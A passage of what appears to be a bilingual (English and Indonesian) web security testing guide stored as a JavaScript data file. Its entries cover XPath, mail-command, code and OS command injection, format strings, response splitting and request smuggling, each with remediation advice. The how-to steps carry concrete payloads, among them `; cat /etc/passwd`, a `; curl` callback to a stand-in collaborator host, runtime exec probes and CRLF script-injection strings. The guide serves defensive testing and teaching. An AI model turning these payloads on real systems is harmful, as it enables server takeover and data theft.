        s: 'Matikan SSI kalau nggak dibutuhkan, blokir perintah `exec`, dan bersihkan input user sebelum jadi HTML.'
      }
    },

    {
      name_en: 'Testing for XPath Injection',
      name_id: { t: 'Pengujian XPath Injection', b: 'Pengujian Injeksi XPath', s: 'Nyerang Query XPath' },
      summary: {
        en: 'Input concatenated into an XPath query lets the attacker reshape the expression. XPath has no LIMIT clause and no granular permissions — one injection typically exposes the entire XML document.',
        t: 'Input yang digabung ke query XPath memungkinkan penyerang membentuk ulang ekspresi. XPath tidak punya klausa LIMIT dan tidak punya izin granular — satu injeksi umumnya membocorkan seluruh dokumen XML.',
        b: 'Masukan yang disisipkan ke kueri XPath memberi penyerang kemampuan menyusun ulang ekspresi. XPath tidak mengenal klausa LIMIT dan tidak memiliki izin yang terperinci — satu kali injeksi biasanya sudah cukup untuk membocorkan keseluruhan dokumen XML.',
        s: 'Kayak SQLi tapi untuk data XML. Kalau berhasil, satu pintu buka semua isi dokumen — nggak ada batasan izin.'
      },
      howto: {
        en: [
          'Identify XPath-powered lookups — apps storing data in XML, REST endpoints querying XML backends.',
          'Break the expression with quotes and observe errors: `\'`, `\'or\'1\'=\'1`, `x\' or 1=1 or \')`.',
          'Try the universal truth: `\' or \'1\'=\'1` — if it returns all nodes, injection is confirmed.',
          'Extract structure via blind boolean tests like `\'or string-length(name)=5 and \'1\'=\'1` to walk fields character by character.',
          'Use `\'] | //user[\'1\'=\'1` style payloads to union additional node sets into the result.'
        ],
        t: [
          'Identifikasi lookup berbasis XPath — aplikasi dengan data di XML, endpoint REST yang men-query backend XML.',
          'Pecahkan ekspresi dengan tanda kutip dan amati error: `\'`, `\'or\'1\'=\'1`, `x\' or 1=1 or \')`.',
          'Coba kebenaran universal: `\' or \'1\'=\'1` — jika menghasilkan semua node, injeksi terkonfirmasi.',
          'Ekstrak struktur via uji boolean blind seperti `\'or string-length(name)=5 and \'1\'=\'1` untuk berjalan menyusuri field karakter demi karakter.',
          'Gunakan payload bergaya `\'] | //user[\'1\'=\'1` untuk menggabungkan node set tambahan ke hasil.'
        ],
        b: [
          'Identifikasi pencarian berbasis XPath — aplikasi dengan data pada XML, endpoint REST yang menanya backend XML.',
          'Pecahkan ekspresi dengan tanda kutip dan amati galat: `\'`, `\'or\'1\'=\'1`, `x\' or 1=1 or \')`.',
          'Coba kebenaran universal: `\' or \'1\'=\'1` — jika menghasilkan semua simpul, injeksi terbukti.',
          'Ekstrak struktur melalui uji boolean buta seperti `\'or string-length(name)=5 and \'1\'=\'1` untuk menyusuri bidang karakter demi karakter.',
          'Gunakan muatan bergaya `\'] | //user[\'1\'=\'1` untuk menggabungkan kumpulan simpul tambahan ke hasil.'
        ],
        s: [
          'Aplikasi yang nyimpen data di XML biasanya query pakai XPath — itu targetnya.',
          'Ketik tanda kutip satu — `\'` — error berarti input kita masuk query.',
          'Coba `\' or \'1\'=\'1` — kalau semua hasil keluar, beres.',
          'Kalau error-nya nggak kelihatan, pancing pakai perbandingan panjang huruf satu-satu.',
          'Payload `\'] | //user[\'1\'=\'1` bisa nambahin hasil node lain ke query.'
        ]
      },
      tools: ['Burp Suite', 'xpathbruter', 'xcat'],
      remediation: {
        en: 'Never build XPath expressions from raw input: use parameterized/compiled XPath variables, escape quotes, and validate against a strict allowlist before querying.',
        t: 'Jangan pernah membangun ekspresi XPath dari input mentah: gunakan variabel XPath parameterized/compiled, escape tanda kutip, dan validasi dengan allowlist ketat sebelum query.',
        b: 'Jangan pernah membangun ekspresi XPath dari masukan mentah: gunakan variabel XPath berparameter/terkompilasi, enkode tanda kutip, dan validasi dengan daftar izin ketat sebelum menanya.',
        s: 'Query XPath harus pakai variabel terpisah, bukan nyambung string. Kutip satu wajib di-escape.'
      }
    },

    {
      name_en: 'Testing for IMAP SMTP Injection',
      name_id: { t: 'Pengujian IMAP/SMTP Injection', b: 'Pengujian Injeksi IMAP/SMTP', s: 'Nyerang Server Email' },
      summary: {
        en: 'Webmail front-ends often concatenate input into IMAP/SMTP commands. Injected newlines and command syntax let the attacker execute arbitrary mail commands — reading other inboxes or sending mail as the server.',
        t: 'Front-end webmail sering menggabungkan input ke perintah IMAP/SMTP. Newline dan sintaks perintah yang diinjeksi memungkinkan penyerang mengeksekusi perintah mail arbitrer — membaca inbox orang lain atau mengirim email atas nama server.',
        b: 'Antarmuka webmail sering menggabungkan masukan ke perintah IMAP/SMTP. Baris baru dan sintaks perintah yang disuntik memungkinkan penyerang menjalankan perintah surel bebas — membaca kotak masuk orang lain atau mengirim surel atas nama peladen.',
        s: 'Aplikasi webmail kadang nyambungin input kita langsung ke perintah email server. Dengan nyisipin perintah sendiri, kita bisa baca email orang lain.'
      },
      howto: {
        en: [
          'Locate webmail parameters passed to the mail server: usernames, mailbox names, search strings, folder paths.',
          'Inject command separators and observe: `INBOX%0d%0aA001 CAPABILITY` on a folder parameter.',
          'Try command chaining: `user@test.com%0d%0aA002 LIST \"\" *` to list all mailboxes.',
          'For SMTP fields, inject an extra recipient: `victim@evil.com%0d%0aDATA` in a recipient/subject field.',
          'Map which parameters reach the mail server by comparing IMAP error markers in responses.'
        ],
        t: [
          'Temukan parameter webmail yang diteruskan ke mail server: username, nama mailbox, string pencarian, path folder.',
          'Injeksi pemisah perintah dan amati: `INBOX%0d%0aA001 CAPABILITY` pada parameter folder.',
          'Coba perantaian perintah: `user@test.com%0d%0aA002 LIST \"\" *` untuk mendaftar semua mailbox.',
          'Untuk field SMTP, injeksi penerima ekstra: `victim@evil.com%0d%0aDATA` pada field penerima/subjek.',
          'Petakan parameter mana yang sampai ke mail server dengan membandingkan penanda error IMAP di response.'
        ],
        b: [
          'Temukan parameter webmail yang diteruskan ke peladen surel: nama pengguna, nama kotak surel, untai pencarian, jalur folder.',
          'Injeksikan pemisah perintah dan amati: `INBOX%0d%0aA001 CAPABILITY` pada parameter folder.',
          'Coba perantaian perintah: `user@test.com%0d%0aA002 LIST \"\" *` untuk mendaftar semua kotak surel.',
          'Untuk bidang SMTP, injeksikan penerima ekstra: `victim@evil.com%0d%0aDATA` pada bidang penerima/subjek.',
          'Petakan parameter mana yang sampai ke peladen surel dengan membandingkan penanda galat IMAP pada respons.'
        ],
        s: [
          'Cari parameter webmail: nama folder, username, kolom pencarian.',
          'Sisipin `%0d%0a` (itu Enter) plus perintah IMAP, misal `INBOX%0d%0aA001 CAPABILITY`.',
          'Perintah `LIST \"\" *` bisa nampilin semua folder email — kadang folder orang lain.',
          'Di kolom penerima email, coba tambahin penerima kedua pakai `%0d%0a`.',
          'Bandingkan responsnya buat tahu parameter mana yang beneran nyampe ke server email.'
        ]
      },
      tools: ['Burp Suite', 'netcat', 'telnet', 'imap CLI clients'],
      remediation: {
        en: 'Sanitize CR/LF and IMAP/SMTP metacharacters from every field reaching the mail server, and use parameterized mail-library APIs instead of building protocol commands by hand.',
        t: 'Bersihkan CR/LF dan metakarakter IMAP/SMTP dari setiap field yang menuju mail server, dan gunakan API library mail berparameter alih-alih membangun perintah protokol secara manual.',
        b: 'Bersihkan CR/LF dan karakter khusus IMAP/SMTP dari setiap bidang yang menuju peladen surel, dan gunakan API pustaka surel berparameter alih-alih membangun perintah protokol secara manual.',
        s: 'Karakter Enter dan simbol khusus IMAP/SMTP wajib dibuang dari input. Pakai library email yang punya parameter resmi.'
      }
    },

    {
      name_en: 'Testing for Code Injection',
      name_id: { t: 'Pengujian Code Injection', b: 'Pengujian Injeksi Kode', s: 'Nyuntik Kode Program' },
      summary: {
        en: 'The server evaluates user input as code — through eval(), dynamic include, or expression resolvers. One successful payload means direct arbitrary code execution inside the application process.',
        t: 'Server mengevaluasi input user sebagai kode — melalui eval(), include dinamis, atau expression resolver. Satu payload yang berhasil berarti arbitrary code execution langsung di dalam proses aplikasi.',
        b: 'Peladen mengevaluasi masukan pengguna sebagai kode — melalui eval(), penyertaan dinamis, atau pengurai ekspresi. Satu muatan yang berhasil berarti eksekusi kode bebas langsung di dalam proses aplikasi.',
        s: 'Kadang server asal mengeksekusi input sebagai kode program — kayak `eval()`. Kalau kita bisa nyuntik kode, kita ngendaliin aplikasinya.'
      },
      howto: {
        en: [
          'Find features that look dynamic: calculators, template previews, rule engines, expression inputs.',
          'Inject language probes: `1+1` returning 2, or `phpinfo()` hints PHP; try `<?php system(\'id\'); ?>` where input is written into an evaluated file.',
          'For Node/JS eval chains: `process.exit(1)` or `require(\'child_process\').exec(\'id\')` in an expression field.',
          'For expression languages (SpEL/OGNL/MVEL): `${7*7}` returning 49 means the resolver runs — escalate to runtime exec like `${Runtime.getRuntime().exec(\'id\')}`.',
          'Time-based fallback: `sleep(10)` style payloads in the expected language and watch the response delay.'
        ],
        t: [
          'Cari fitur yang tampak dinamis: kalkulator, pratinjau template, rule engine, input ekspresi.',
          'Injeksi probe bahasa: `1+1` yang menghasilkan 2, atau `phpinfo()` menandakan PHP; coba `<?php system(\'id\'); ?>` bila input ditulis ke file yang dievaluasi.',
          'Untuk rantai eval Node/JS: `process.exit(1)` atau `require(\'child_process\').exec(\'id\')` pada field ekspresi.',
          'Untuk expression language (SpEL/OGNL/MVEL): `${7*7}` yang menghasilkan 49 berarti resolver aktif — eskalasi ke runtime exec seperti `${Runtime.getRuntime().exec(\'id\')}`.',
          'Jika perlu, gunakan payload berbasis waktu: `sleep(10)` sesuai bahasa target dan ukur delay response.'
        ],
        b: [
          'Cari fitur yang tampak dinamis: kalkulator, pratonton templat, mesin aturan, masukan ekspresi.',
          'Injeksikan pemeriksa bahasa: `1+1` yang menghasilkan 2, atau `phpinfo()` menandakan PHP; coba `<?php system(\'id\'); ?>` bila masukan ditulis ke berkas yang dievaluasi.',
          'Untuk rantai eval Node/JS: `process.exit(1)` atau `require(\'child_process\').exec(\'id\')` pada bidang ekspresi.',
          'Untuk bahasa ekspresi (SpEL/OGNL/MVEL): `${7*7}` yang menghasilkan 49 berarti pengurai aktif — naikkan ke eksekusi runtime seperti `${Runtime.getRuntime().exec(\'id\')}`.',
          'Jika perlu, gunakan muatan berbasis waktu: `sleep(10)` sesuai bahasa sasaran dan ukur tunda respons.'
        ],
        s: [
          'Fitur kayak kalkulator atau input aturan sering eval() mentah — itu target.',
          'Ketik `1+1` — kalau keluar 2, kode kita dieksekusi.',
          'Coba `sleep(10)` — kalau responsnya lambat 10 detik, pasti dieksekusi.',
          'Naik kelas: di PHP coba `phpinfo()`, di JS `process.exit(1)`.',
          'Kalau expression language kayak SpEL: `${7*7}` menghasilkan 49 itu lampu hijau.'
        ]
      },
      tools: ['Burp Suite', 'tplmap', 'ffuf', 'language REPLs for payloads'],
      remediation: {
        en: 'Never pass user input to eval-like functions; replace dynamic evaluation with data-driven lookup, sandbox resolvers, and language-level restrictions (disable script engines where unneeded).',
        t: 'Jangan pernah meneruskan input user ke fungsi ala eval; ganti evaluasi dinamis dengan lookup berbasis data, resolver tersandbox, dan pembatasan di level bahasa (matikan script engine yang tidak dibutuhkan).',
        b: 'Jangan pernah meneruskan masukan pengguna ke fungsi serupa eval; ganti evaluasi dinamis dengan pencarian berbasis data, pengurai terasing, dan pembatasan di tingkat bahasa (matikan mesin skrip yang tak dibutuhkan).',
        s: 'Input user jangan pernah di-eval. Ganti fitur dinamis dengan tabel/lookup biasa.'
      }
    },

    {
      name_en: 'Testing for Command Injection',
      name_id: { t: 'Pengujian Command Injection (OS Command Injection)', b: 'Pengujian Injeksi Perintah', s: 'Jalanin Perintah Server' },
      summary: {
        en: 'Input lands in a shell command via system(), exec(), or backticks. Metacharacters like `;`, `&&`, `||`, and backticks chain attacker OS commands onto the intended one — direct server control.',
        t: 'Input masuk ke perintah shell melalui system(), exec(), atau backtick. Metakarakter seperti `;`, `&&`, `||`, dan backtick merantaikan perintah OS penyerang ke perintah asli — kendali langsung atas server.',
        b: 'Masukan masuk ke perintah shell melalui system(), exec(), atau tanda kutip balik. Karakter khusus seperti `;`, `&&`, `||`, dan tanda kutip balik merantaikan perintah OS penyerang ke perintah asli — kendali langsung atas peladen.',
        s: 'Server ngejalanin perintah dari input kita — kayak fitur ping atau export. Kalau bisa nambahin perintah sendiri pakai `;`, kita bisa ngapa-ngapain server.'
      },
      howto: {
        en: [
          'Find features that spawn processes: ping/traceroute tools, file conversion, backup jobs, image processing.',
          'Chain a benign command with separators: `127.0.0.1; id`, `127.0.0.1 && id`, `127.0.0.1 | id`.',
          'Read proof files: `; cat /etc/passwd` or `; cat /etc/hostname` and look for the output in the response.',
          'If output is hidden, use blind detection: `127.0.0.1; sleep 10` and time the response, or out-of-band callbacks with `; curl http://yourcollaborator.example`.',
          'Fingerprint the OS from error output (`\'` vs `\"` quoting behaviors) and adapt payloads for Windows: `127.0.0.1 & dir`, `127.0.0.1 && whoami`.'
        ],
        t: [
          'Cari fitur yang memicu proses: tool ping/traceroute, konversi file, job backup, pemrosesan gambar.',
          'Rantaikan perintah jinak dengan pemisah: `127.0.0.1; id`, `127.0.0.1 && id`, `127.0.0.1 | id`.',
          'Baca file bukti: `; cat /etc/passwd` atau `; cat /etc/hostname` dan cari keluarannya di response.',
          'Jika keluaran tersembunyi, gunakan deteksi blind: `127.0.0.1; sleep 10` dan ukur waktu respons, atau callback out-of-band dengan `; curl http://yourcollaborator.example`.',
          'Fingerprint OS dari keluaran error (perilaku kutip `\'` vs `\"`) dan sesuaikan payload untuk Windows: `127.0.0.1 & dir`, `127.0.0.1 && whoami`.'
        ],
        b: [
          'Cari fitur yang memicu proses: alat ping/traceroute, konversi berkas, tugas cadangan, pengolahan gambar.',
          'Rantaikan perintah jinak dengan pemisah: `127.0.0.1; id`, `127.0.0.1 && id`, `127.0.0.1 | id`.',
          'Baca berkas bukti: `; cat /etc/passwd` atau `; cat /etc/hostname` dan cari keluarannya pada respons.',
          'Jika keluaran tersembunyi, gunakan deteksi buta: `127.0.0.1; sleep 10` dan ukur waktu respons, atau panggilan balik luar pita dengan `; curl http://yourcollaborator.example`.',
          'Identifikasi OS dari keluaran galat (perilaku kutip `\'` vs `\"`) dan sesuaikan muatan untuk Windows: `127.0.0.1 & dir`, `127.0.0.1 && whoami`.'
        ],
        s: [
          'Fitur kayak \"ping host\" atau konversi file itu target klasik — mereka jalanin perintah di server.',
          'Isi `127.0.0.1; id` — titik koma itu pemisah perintah. Kalau muncul hasil `id`, beres.',
          'Bukti kuat: `; cat /etc/passwd` — isi file itu nggak mungkin ada kalau kita nggak jalanin perintah.',
          'Kalau keluarannya nggak kelihatan, coba `127.0.0.1; sleep 10` — kalau responsnya mendadak lambat, perintah kita jalan.',
          'Untuk Windows server, pemisahnya beda: pakai `&` — misal `127.0.0.1 & dir`.'
        ]
      },
      tools: ['Burp Suite', 'Commix', 'curl', 'OWASP ZAP', 'command inject wordlists'],
      remediation: {
        en: 'Avoid shell calls entirely — use language APIs for the task; where unavoidable, pass arguments as an array (no shell string), validate input with a strict allowlist, and never allow separators or quotes.',
        t: 'Hindari pemanggilan shell sepenuhnya — gunakan API bahasa untuk tugasnya; bila tak terhindarkan, kirim argumen sebagai array (bukan string shell), validasi input dengan allowlist ketat, dan jangan izinkan pemisah atau tanda kutip.',
        b: 'Hindari pemanggilan shell sama sekali dengan memakai API bahasa untuk tugas yang bersangkutan. Apabila tak terhindarkan, kirim argumen sebagai larik (bukan untai shell), validasi masukan memakai daftar izin yang ketat, dan tolak pemisah maupun tanda kutip.',
        s: 'Jangan panggil shell dari aplikasi kalau bisa. Kalau terpaksa, kirim argumennya sebagai array, bukan string yang disambung, dan tolak semua karakter pemisah.'
      }
    },

    {
      name_en: 'Testing for Format String Injection',
      name_id: { t: 'Pengujian Format String Injection', b: 'Pengujian Injeksi Format String', s: 'Nyerang Format String' },
      summary: {
        en: 'When format functions receive user input as the format string itself, specifiers like `%x`, `%n` read or write process memory. A relic from C apps, still live in some embedded/firmware web front-ends.',
        t: 'Saat fungsi format menerima input user sebagai format string itu sendiri, specifier seperti `%x` dan `%n` membaca atau menulis memori proses. Sisa dari aplikasi C, masih hidup di sebagian front-end web embedded/firmware.',
        b: 'Ketika fungsi format menerima masukan pengguna sebagai untai format itu sendiri, penentu seperti `%x` dan `%n` membaca atau menulis memori proses. Warisan aplikasi C, masih hidup pada sebagian antarmuka web tertanam/perangkat tegar.',
        s: 'Bug khas aplikasi C: kalau input kita jadi format string, `%x` bisa baca memori dan `%n` bisa nulis. Sekarang jarang, tapi masih ada di perangkat lama.'
      },
      howto: {
        en: [
          'Find C-backed endpoints — routers, IoT device web UIs, CGI binaries — and their string-echoing parameters.',
          'Send plain `%s` or `%x`: a crash or hexdump-like output means the input reached a format function.',
          'Flood specifiers to walk the stack: `AAAA%08x.%08x.%08x.%08x` and look for `0x41414141` in output.',
          'Map stack offsets by incrementing the position specifier, then read memory addresses with `%s` on chosen offsets.',
          'Where writes are possible (`%n`), document it as critical — arbitrary memory write is a crash-to-RCE path.'
        ],
        t: [
          'Temukan endpoint berbasis C — UI web router, perangkat IoT, binary CGI — beserta parameternya yang memantulkan string.',
          'Kirim `%s` atau `%x` mentah: crash atau keluaran mirip hexdump berarti input sampai ke fungsi format.',
          'Banjiri specifier untuk menyusuri stack: `AAAA%08x.%08x.%08x.%08x` dan cari `0x41414141` di keluaran.',
          'Petakan offset stack dengan menaikkan position specifier, lalu baca alamat memori dengan `%s` pada offset pilihan.',
          'Bila penulisan dimungkinkan (`%n`), dokumentasikan sebagai kritis — penulisan memori arbitrer adalah jalang dari crash menuju RCE.'
        ],
        b: [
          'Temukan endpoint berbasis C — antarmuka web router, perangkat IoT, binary CGI — beserta parameternya yang memantulkan untai.',
          'Kirim `%s` atau `%x` mentah: keruntuhan atau keluaran mirip hexdump berarti masukan sampai ke fungsi format.',
          'Banjiri penentu untuk menyusuri tumpukan: `AAAA%08x.%08x.%08x.%08x` dan cari `0x41414141` pada keluaran.',
          'Petakan ofset tumpukan dengan menaikkan penentu posisi, lalu baca alamat memori dengan `%s` pada ofset pilihan.',
          'Bila penulisan dimungkinkan (`%n`), dokumentasikan sebagai kritis — penulisan memori bebas adalah jalan dari keruntuhan menuju RCE.'
        ],
        s: [
          'Targetnya biasanya router atau perangkat IoT yang webnya ditulis pakai C.',
          'Ketik `%x` di kolom yang dipantulkan — crash atau keluaran kode aneh itu tandanya.',
          'Kirim `AAAA%08x.%08x.%08x.%08x` — kalau muncul `0x41414141`, kita baca stack-nya.',
          'Naikin offset perlahan buat baca memori yang kita mau.',
          'Kalau `%n` bisa dipakai, itu level kritis — bisa nulis ke memori.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'format string checkers (flawfinder)', 'GDB for crash analysis'],
      remediation: {
        en: 'Pass user data as arguments to a fixed format string (`printf(\"%s\", input)` never `printf(input)`), and compile with format-security flags (e.g. `-Wformat-security`) to catch the pattern at build time.',
        t: 'Kirim data user sebagai argumen ke format string yang tetap (`printf(\"%s\", input)`, bukan `printf(input)`), dan kompilasi dengan flag keamanan format (mis. `-Wformat-security`) agar pola ini tertangkap saat build.',
        b: 'Data pengguna hendaknya dikirim sebagai argumen ke untai format yang tetap (`printf(\"%s\", input)`, bukan `printf(input)`), dan kompilasi dijalankan dengan penanda keamanan format (misalnya `-Wformat-security`) agar pola semacam ini tertangkap ketika build.',
        s: 'Kode harusnya `printf(\"%s\", input)` — bukan `printf(input)`. Compiler bisa bantu nyaringin ini kalau flagnya diaktifin.'
      }
    },

    {
      name_en: 'Testing for Incubated Vulnerability',
      name_id: { t: 'Pengujian Incubated Vulnerability', b: 'Pengujian Kerentanan Inkubasi', s: 'Bug yang Menetas Belakangan' },
      summary: {
        en: 'A payload lies dormant until a later event fires it — a deferred job, a moderator view, an email render, a data export. Testing must therefore revisit stored data at the moment it is consumed, not only when it is stored.',
        t: 'Payload tertidur sampai peristiwa berikutnya memicunya — job tertunda, moderasi, render email, ekspor data. Pengujian karena itu harus mengunjungi ulang data tersimpan saat dikonsumsi, bukan hanya saat disimpan.',
        b: 'Muatan tertidur hingga peristiwa berikutnya memicunya — tugas tertunda, peninjauan moderator, tampilan surel, ekspor data. Pengujian karena itu harus mengunjungi ulang data tersimpan saat dikonsumsi, bukan hanya saat disimpan.',
        s: 'Payload kita kadang nggak jalan langsung — dia nunggu momen: dibuka admin, jadiin email, atau diekspor. Jadi harus dicek ulang di semua momen itu.'
      },
      howto: {
        en: [
          'Plant a marker payload in every persistence sink: comments, profile, tickets, filenames.',
          'Trigger every consumer of that data: admin dashboards, report generators, exports, scheduled jobs, notification emails.',
          'Use time-delayed probes: payloads that only execute when a date field matures or a queue drains.',
          'Check secondary renderers — PDF generators, CSV exports, mobile apps — each may parse the data differently.',
          'Retest after data migrations or feature releases: dormant payloads in old records often wake up in new code paths.'
        ],
        t: [
          'Tanam payload penanda di setiap titik penyimpanan: komentar, profil, tiket, nama file.',
          'Picu setiap konsumen data tersebut: dashboard admin, generator laporan, ekspor, job terjadwal, email notifikasi.',
          'Gunakan probe tertunda-waktu: payload yang hanya tereksekusi saat field tanggal matang atau antrian terkuras.',
          'Periksa renderer sekunder — generator PDF, ekspor CSV, aplikasi mobile — masing-masing bisa mem-parse data secara berbeda.',
          'Uji ulang setelah migrasi data atau rilis fitur: payload tidur di record lama sering bangun di jalur kode baru.'
        ],
        b: [
          'Tanam muatan penanda pada setiap titik penyimpanan: komentar, profil, tiket, nama berkas.',
          'Picu setiap pemakai data tersebut: dasbor admin, pembuat laporan, ekspor, tugas terjadwal, surel pemberitahuan.',
          'Gunakan pemeriksa tertunda-waktu: muatan yang hanya berjalan ketika bidang tanggal jatuh tempo atau antrean habis.',
          'Periksa penampil sekunder — pembuat PDF, ekspor CSV, aplikasi seluler — masing-masing dapat mengurai data secara berbeda.',
          'Uji ulang setelah migrasi data atau peluncuran fitur: muatan tidur pada catatan lama sering bangun di jalur kode baru.'
        ],
        s: [
          'Titipin payload di semua tempat yang nyimpen data: komentar, tiket, nama file.',
          'Jalanin semua fitur yang make data itu — dashboard admin, laporan, ekspor, email.',
          'Beberapa payload cuma kalo dieksekusi pas waktunya — kayak tanggal jatuh tempo atau antrian.',
          'Cek juga hasil olahannya: PDF, CSV, aplikasi HP — masing-masing parse data beda cara.',
          'Uji ulang tiap ada update fitur — data lama bisa jadi bahaya di kode baru.'
        ]
      },
      tools: ['Burp Suite', 'OWASP ZAP', 'scheduled-task triggers', 'PDF/CSV export tools'],
      remediation: {
        en: 'Sanitize data at every consumption point, not just at storage time — treat stored data as untrusted input each time it is rendered or processed.',
        t: 'Sanitasi data di setiap titik konsumsi, bukan hanya saat disimpan — perlakukan data tersimpan sebagai input tidak tepercaya setiap kali dirender atau diproses.',
        b: 'Sanitasi data pada setiap titik pemakaian, bukan hanya saat disimpan — perlakukan data tersimpan sebagai masukan tak tepercaya setiap kali ditampilkan atau diolah.',
        s: 'Data yang udah disimpan harus terus diperlakukan kayak input baru — bersihin tiap kali ditampilkan, bukan cuma sekali saat masuk.'
      }
    },

    {
      name_en: 'Testing for HTTP Splitting Response Smuggling',
      name_id: { t: 'Pengujian HTTP Response Splitting/Smuggling', b: 'Pengujian Pecah Respons HTTP', s: 'Nyerang Lewat Pecah Respons' },
      summary: {
        en: 'Header injection plus CRLF sequences splits one response into two — enabling cache poisoning and response splitting. An attacker who controls a CR/LF in a header can forge an entire second response that other users receive.',
        t: 'Header injection plus sekuens CRLF memecah satu respons menjadi dua — memungkinkan cache poisoning dan response splitting. Penyerang yang mengendalikan CR/LF di header bisa memalsukan respons kedua yang diterima user lain.',
        b: 'Injeksi tajuk plus urutan CRLF memecah satu respons menjadi dua — memungkinkan keracunan singgahan dan pecah respons. Penyerang yang mengendalikan CR/LF pada tajuk dapat memalsukan seluruh respons kedua yang diterima pengguna lain.',
        s: 'Kalau input kita bisa nyisipin Enter di header respons, kita bisa bikin respons kedua palsu — yang dilihat user lain. Bahaya buat cache juga.'
      },
      howto: {
        en: [
          'Identify reflected header values: Location redirects built from input, `set-cookie` from parameters, referer echoes.',
          'Inject CRLF probes: `http://target.com/%0d%0aInjectedHeader:1` in a redirect parameter and check the raw response.',
          'Split into a forged response: `?lang=nl%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>`.',
          'Target cache layers: poison a shared cache entry so every user receives the forged second response.',
          'Test for response smuggling variants — CL.TE/TE.CL desyncs where the split response belongs to another request.'
        ],
        t: [
          'Identifikasi nilai header yang dipantulkan: redirect Location yang dibangun dari input, `set-cookie` dari parameter, echo referer.',
          'Injeksi probe CRLF: `http://target.com/%0d%0aInjectedHeader:1` pada parameter redirect dan periksa respons mentah.',
          'Pecah menjadi respons palsu: `?lang=nl%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>`.',
          'Bidik lapisan cache: racuni entri cache bersama agar setiap user menerima respons kedua palsu.',
          'Uji varian response smuggling — desink CL.TE/TE.CL di mana respons pecah dimiliki oleh request lain.'
        ],
        b: [
          'Identifikasi nilai tajuk yang dipantulkan: pengalihan Location yang dibangun dari masukan, `set-cookie` dari parameter, gema perujuk.',
          'Injeksikan pemeriksa CRLF: `http://target.com/%0d%0aInjectedHeader:1` pada parameter pengalihan dan periksa respons mentah.',
          'Pecah menjadi respons palsu: `?lang=nl%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>`.',
          'Bidik lapisan singgahan: racuni entri singgahan bersama agar setiap pengguna menerima respons kedua palsu.',
          'Uji varian penyelundupan respons — sinkronisasi CL.TE/TE.CL ketika respons pecah dimiliki permintaan lain.'
        ],
        s: [
          'Cari header yang isinya dari input kita — kayak Location redirect.',
          'Sisipin `%0d%0a` (Enter) di parameter redirect — kalau responsnya kepecah, beres.',
          'Payload lengkap: `?lang=nl%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>` — bikin respons kedua.',
          'Kalau ada CDN atau cache, racuni cachenya — semua user bakal lihat respons palsu itu.',
          'Cek juga varian smuggling CL.TE dan TE.CL — pengecekan panjang beda antara proxy dan server.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'HTTP Request Smuggler (Burp extension)', 'netcat'],
      remediation: {
        en: 'Strip CR/LF from any value before placing it into a header, URL-encode redirect targets, and normalize header handling between proxies and backends to prevent desync-based smuggling.',
        t: 'Buang CR/LF dari nilai apa pun sebelum ditempatkan ke header, URL-encode target redirect, dan normalisasi penanganan header antara proxy dan backend untuk mencegah smuggling berbasis desink.',
        b: 'Buang CR/LF dari nilai apa pun sebelum ditempatkan ke tajuk, enkode URL target pengalihan, dan normalkan penanganan tajuk antara proksi dan backend untuk mencegah penyelundupan berbasis sinkronisasi.',
        s: 'Karakter Enter wajib dibuang sebelum jadi header. Normalin juga cara proxy dan server baca panjang respons biar nggak beda pendapat.'
      }
    },

    {
      name_en: 'Testing for HTTP Incoming Request Smuggling',
      name_id: { t: 'Pengujian HTTP Request Smuggling', b: 'Pengujian Penyelundupan Permintaan HTTP', s: 'Nyelinap di Antara Proxy' },
      summary: {
        en: 'Front-end proxy and back-end server disagree about request boundaries (Content-Length vs Transfer-Encoding), letting a smuggled prefix hijack the next user request — bypass controls, poison caches, steal credentials.',
        t: 'Proxy front-end dan server backend tidak sepakat soal batas request (Content-Length vs Transfer-Encoding), sehingga prefix yang diselundupkan membajak request user berikutnya — bypass kontrol, meracuni cache, mencuri kredensial.',
        b: 'Proksi depan dan peladen belakang tidak sepakat soal batas permintaan (Content-Length vs Transfer-Encoding), sehingga awalan yang diselundupkan membajak permintaan pengguna berikutnya — mengelak kontrol, meracuni singgahan, mencuri kredensial.',
        s: 'Proxy depan dan server belakang kadang beda pendapat soal di mana request berakhir. Kita bisa nyelinapin potongan request — nanti nempel di request orang lain.'
      },
      howto: {
        en: [
          'Identify the proxy stack via headers (`Via`, `X-Forwarded-For`) — smuggling needs a front/back pair that parses differently.',
          'Send CL.TE probes: a `Content-Length` the front honors plus a chunked `Transfer-Encoding: chunked` body the back-end reads differently.',
          'Classic prefix: `POST / HTTP/1.1` body ending with `0` chunk followed by `GET /admin HTTP/1.1` — see which user request returns admin content.',
          'Try TE.CL and TE.TE variants — duplicate/conflicting Transfer-Encoding headers that only one side rejects.',
          'Confirm by observing misrouted responses: another session receiving your smuggled response content is the smoking gun.'
        ],
        t: [
          'Identifikasi stack proxy via header (`Via`, `X-Forwarded-For`) — smuggling butuh pasangan front/back yang mem-parse berbeda.',
          'Kirim probe CL.TE: `Content-Length` yang dihormati front ditambah body chunked `Transfer-Encoding: chunked` yang dibaca backend secara berbeda.',
          'Prefix klasik: body `POST / HTTP/1.1` diakhiri chunk `0` lalu `GET /admin HTTP/1.1` — lihat request user mana yang menerima konten admin.',
          'Coba varian TE.CL dan TE.TE — header Transfer-Encoding ganda/bertentangan yang hanya ditolak satu pihak.',
          'Konfirmasi dari respons yang salah sasaran: sesi lain menerima konten respons selundupan Anda adalah bukti kuat.'
        ],
        b: [
          'Identifikasi tumpukan proksi melalui tajuk (`Via`, `X-Forwarded-For`) — penyelundupan memerlukan pasangan depan/belakang yang mengurai berbeda.',
          'Kirim pemeriksa CL.TE: `Content-Length` yang dihormati depan ditambah isi chunked `Transfer-Encoding: chunked` yang dibaca belakang secara berbeda.',
          'Awalan klasik: isi `POST / HTTP/1.1` diakhiri chunk `0` lalu `GET /admin HTTP/1.1` — lihat permintaan pengguna mana yang menerima konten admin.',
          'Coba varian TE.CL dan TE.TE — tajuk Transfer-Encoding ganda/bertentangan yang hanya ditolak satu pihak.',
          'Pastikan dari respons yang salah sasaran: sesi lain menerima isi respons selundupan Anda adalah bukti kuat.'
        ],
        s: [
          'Cek header `Via` — ada proxy berarti kemungkinan bisa diselundupin.',
          'Trik dasarnya: kirim `Content-Length` sekaligus `Transfer-Encoding: chunked` — front baca yang satu, belakang baca yang lain.',
